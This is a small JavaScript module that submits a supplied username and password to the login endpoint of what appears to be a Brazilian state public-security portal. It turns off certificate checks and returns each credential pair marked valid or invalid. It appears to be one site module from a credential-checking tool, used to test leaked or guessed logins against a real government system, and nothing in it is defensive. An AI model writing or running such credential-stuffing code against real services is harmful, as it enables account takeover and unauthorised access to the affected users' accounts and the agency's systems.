import axios from "axios";
import https from 'https'
import request from '../core/configs.js'
export default async function sispEs(login, pass) {

  const url = 'http://portal.sisp.es.gov.br/sispes-frontend/xhtml/j_security_check'

  
  const dataRequest = `j_username=${login}&j_password=${pass}&submit.x=43&submit.y=9`;

  const { data } = await axios({
    method: "POST",
    headers: request.headers,
    data: dataRequest,
    url: url,
    httpsAgent: new https.Agent({  
        rejectUnauthorized: false // Desabilita a verificação do certificado
      }),

  });

  if (data.includes("A combinação usuário e senha não confere."))
    return {
      success: false,
      login: login + ":" + pass,
      uri: url,
    };
  return {
    success: true,
    login: login + ":" + pass,
    uri: url,
  };
}
